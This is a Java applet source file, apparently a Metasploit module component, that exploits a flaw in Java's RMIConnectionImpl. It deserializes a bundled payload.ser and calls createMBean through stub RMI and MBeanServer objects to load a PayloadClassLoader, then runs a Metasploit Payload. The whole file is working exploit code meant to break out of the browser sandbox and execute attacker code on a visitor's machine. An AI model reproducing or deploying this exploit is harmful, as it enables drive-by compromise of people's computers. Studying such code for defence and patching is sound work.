import java.applet.Applet;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.rmi.MarshalledObject;
import java.rmi.Remote;
import java.util.Set;

import javax.management.Attribute;
import javax.management.AttributeList;
import javax.management.AttributeNotFoundException;
import javax.management.InstanceAlreadyExistsException;
import javax.management.InstanceNotFoundException;
import javax.management.IntrospectionException;
import javax.management.InvalidAttributeValueException;
import javax.management.ListenerNotFoundException;
import javax.management.MBeanException;
import javax.management.MBeanInfo;
import javax.management.MBeanRegistrationException;
import javax.management.MBeanServer;
import javax.management.NotCompliantMBeanException;
import javax.management.NotificationFilter;
import javax.management.NotificationListener;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.OperationsException;
import javax.management.QueryExp;
import javax.management.ReflectionException;
import javax.management.loading.ClassLoaderRepository;
import javax.management.remote.rmi.RMIConnection;
import javax.management.remote.rmi.RMIConnectionImpl;
import javax.management.remote.rmi.RMIServerImpl;
import javax.security.auth.Subject;

import metasploit.Payload;

/**
 * This class exploits the vulnerability in the RMIConnectionImpl class by
 * loading the serialized PayloadClassloader.
 * 
 * @author mka
 * 
 */
public class Exploit extends Applet {

	private static final long serialVersionUID = 2205862970052148546L;

	@Override
	public void init() {
		try {

			MarshalledObject params = this.getPayload();

			RMIServerImpl impl = getRMIServerImpl();
			impl.setMBeanServer(getMbeanServer());
			RMIConnectionImpl connectionImpl = new RMIConnectionImpl(impl,
					"metasploit", null, null, null);

			connectionImpl.createMBean("PayloadClassLoader", null, null,
					params, null, null);

		} catch (Exception e) {
			try {

				PayloadClassLoader.instance.loadIt();
				Payload.main(null);
			} catch (Exception e1) {

			}

		}

	}

	private MBeanServer getMbeanServer() {

		return new MBeanServer() {

			@Override
			public void unregisterMBean(ObjectName name)
					throws InstanceNotFoundException,
					MBeanRegistrationException {

			}

			@Override
			public AttributeList setAttributes(ObjectName name,
					AttributeList attributes) throws InstanceNotFoundException,
					ReflectionException {

				return null;
			}

			@Override
			public void setAttribute(ObjectName name, Attribute attribute)
					throws InstanceNotFoundException,
					AttributeNotFoundException, InvalidAttributeValueException,
					MBeanException, ReflectionException {

			}

			@Override
			public void removeNotificationListener(ObjectName name,
					NotificationListener listener, NotificationFilter filter,
					Object handback) throws InstanceNotFoundException,
					ListenerNotFoundException {

			}

			@Override
			public void removeNotificationListener(ObjectName name,
					ObjectName listener, NotificationFilter filter,
					Object handback) throws InstanceNotFoundException,
					ListenerNotFoundException {

			}

			@Override
			public void removeNotificationListener(ObjectName name,
					NotificationListener listener)
					throws InstanceNotFoundException, ListenerNotFoundException {

			}

			@Override
			public void removeNotificationListener(ObjectName name,
					ObjectName listener) throws InstanceNotFoundException,
					ListenerNotFoundException {

			}

			@Override
			public ObjectInstance registerMBean(Object object, ObjectName name)
					throws InstanceAlreadyExistsException,
					MBeanRegistrationException, NotCompliantMBeanException {

				return null;
			}

			@Override
			public Set<ObjectName> queryNames(ObjectName name, QueryExp query) {

				return null;
			}

			@Override
			public Set<ObjectInstance> queryMBeans(ObjectName name,
					QueryExp query) {

				return null;
			}

			@Override
			public boolean isRegistered(ObjectName name) {

				return false;
			}

			@Override
			public boolean isInstanceOf(ObjectName name, String className)
					throws InstanceNotFoundException {

				return false;
			}

			@Override
			public Object invoke(ObjectName name, String operationName,
					Object[] params, String[] signature)
					throws InstanceNotFoundException, MBeanException,
					ReflectionException {

				return null;
			}

			@Override
			public Object instantiate(String className, ObjectName loaderName,
					Object[] params, String[] signature)
					throws ReflectionException, MBeanException,
					InstanceNotFoundException {

				return null;
			}

			@Override
			public Object instantiate(String className, Object[] params,
					String[] signature) throws ReflectionException,
					MBeanException {

				return null;
			}

			@Override
			public Object instantiate(String className, ObjectName loaderName)
					throws ReflectionException, MBeanException,
					InstanceNotFoundException {

				return null;
			}

			@Override
			public Object instantiate(String className)
					throws ReflectionException, MBeanException {

				return null;
			}

			@Override
			public ObjectInstance getObjectInstance(ObjectName name)
					throws InstanceNotFoundException {

				return null;
			}

			@Override
			public MBeanInfo getMBeanInfo(ObjectName name)
					throws InstanceNotFoundException, IntrospectionException,
					ReflectionException {

				return null;
			}

			@Override
			public Integer getMBeanCount() {

				return null;
			}

			@Override
			public String[] getDomains() {

				return null;
			}

			@Override
			public String getDefaultDomain() {

				return null;
			}

			@Override
			public ClassLoaderRepository getClassLoaderRepository() {

				return new ClassLoaderRepository() {

					@Override
					public Class<?> loadClassWithout(ClassLoader exclude,
							String className) throws ClassNotFoundException {

						return null;
					}

					@Override
					public Class<?> loadClassBefore(ClassLoader stop,
							String className) throws ClassNotFoundException {

						return null;
					}

					@Override
					public Class<?> loadClass(String className)
							throws ClassNotFoundException {

						return null;
					}
				};
			}

			@Override
			public ClassLoader getClassLoaderFor(ObjectName mbeanName)
					throws InstanceNotFoundException {

				return null;
			}

			@Override
			public ClassLoader getClassLoader(ObjectName loaderName)
					throws InstanceNotFoundException {

				return null;
			}

			@Override
			public AttributeList getAttributes(ObjectName name,
					String[] attributes) throws InstanceNotFoundException,
					ReflectionException {

				return null;
			}

			@Override
			public Object getAttribute(ObjectName name, String attribute)
					throws MBeanException, AttributeNotFoundException,
					InstanceNotFoundException, ReflectionException {

				return null;
			}

			@Override
			public ObjectInputStream deserialize(String className,
					ObjectName loaderName, byte[] data)
					throws InstanceNotFoundException, OperationsException,
					ReflectionException {

				return null;
			}

			@Override
			public ObjectInputStream deserialize(String className, byte[] data)
					throws OperationsException, ReflectionException {

				return null;
			}

			@Override
			public ObjectInputStream deserialize(ObjectName name, byte[] data)
					throws InstanceNotFoundException, OperationsException {

				return null;
			}

			@Override
			public ObjectInstance createMBean(String className,
					ObjectName name, ObjectName loaderName, Object[] params,
					String[] signature) throws ReflectionException,
					InstanceAlreadyExistsException, MBeanRegistrationException,
					MBeanException, NotCompliantMBeanException,
					InstanceNotFoundException {

				return null;
			}

			@Override
			public ObjectInstance createMBean(String className,
					ObjectName name, Object[] params, String[] signature)
					throws ReflectionException, InstanceAlreadyExistsException,
					MBeanRegistrationException, MBeanException,
					NotCompliantMBeanException {

				return null;
			}

			@Override
			public ObjectInstance createMBean(String className,
					ObjectName name, ObjectName loaderName)
					throws ReflectionException, InstanceAlreadyExistsException,
					MBeanRegistrationException, MBeanException,
					NotCompliantMBeanException, InstanceNotFoundException {

				return null;
			}

			@Override
			public ObjectInstance createMBean(String className, ObjectName name)
					throws ReflectionException, InstanceAlreadyExistsException,
					MBeanRegistrationException, MBeanException,
					NotCompliantMBeanException {

				return null;
			}

			@Override
			public void addNotificationListener(ObjectName name,
					ObjectName listener, NotificationFilter filter,
					Object handback) throws InstanceNotFoundException {

			}

			@Override
			public void addNotificationListener(ObjectName name,
					NotificationListener listener, NotificationFilter filter,
					Object handback) throws InstanceNotFoundException {

			}
		};
	}

	private RMIServerImpl getRMIServerImpl() {

		return new RMIServerImpl(null) {

			@Override
			public Remote toStub() throws IOException {

				return null;
			}

			@Override
			protected RMIConnection makeClient(String connectionId,
					Subject subject) throws IOException {

				return null;
			}

			@Override
			protected String getProtocol() {

				return null;
			}

			@Override
			protected void export() throws IOException {

			}

			@Override
			protected void closeServer() throws IOException {

			}

			@Override
			protected void closeClient(RMIConnection client) throws IOException {

			}
		};

	}

	public MarshalledObject getPayload() throws IOException,
			ClassNotFoundException {

		InputStream f = super.getClass().getResourceAsStream("payload.ser");
		ObjectInputStream stream = new ObjectInputStream(f);
		MarshalledObject object = (MarshalledObject) stream.readObject();
		stream.close();
		return object;

	}
}
